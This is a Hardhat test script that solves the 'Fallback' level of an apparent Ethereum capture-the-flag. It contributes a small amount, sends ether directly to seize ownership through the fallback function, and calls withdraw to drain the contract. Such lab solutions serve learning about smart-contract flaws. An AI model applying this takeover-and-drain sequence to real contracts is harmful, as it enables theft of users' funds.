import { expect } from "chai";
import { Contract, Signer } from "ethers";
import { ethers } from "hardhat";
import { createChallenge, submitLevel } from "./utils";

let accounts: Signer[];
let eoa: Signer;
let attacker: Contract;
let challenge: Contract; // challenge contract
let tx: any;

before(async () => {
  accounts = await ethers.getSigners();
  [eoa] = accounts;
  const challengeFactory = await ethers.getContractFactory(`Fallback`)
  const challengeAddress = await createChallenge(`0x9CB391dbcD447E645D6Cb55dE6ca23164130D008`)
  challenge = await challengeFactory.attach(challengeAddress);
});

it("calls contribute method", async function() {
  tx = await challenge.contribute({
    value: ethers.utils.parseUnits(`1`, `wei`)
  }),
  await tx.wait();
  console.log(tx)
})

it("checks for added contributions", async function() {
  console.log(await challenge.getContribution())
})

it("sends a transaction to contract", async function () {
  tx = await eoa.sendTransaction({
    to: challenge.address,
    value: ethers.utils.parseUnits(`2`, `wei`)
  })
  tx.wait();
  console.log(tx);
})

it("checks who owner is", async function() {
  console.log(await challenge.owner());
})

it("withdraws all money from contract", async function() {
  console.log(await challenge.withdraw());
})

after(async () => {
  expect(await submitLevel(challenge.address), "level not solved").to.be.true;
});
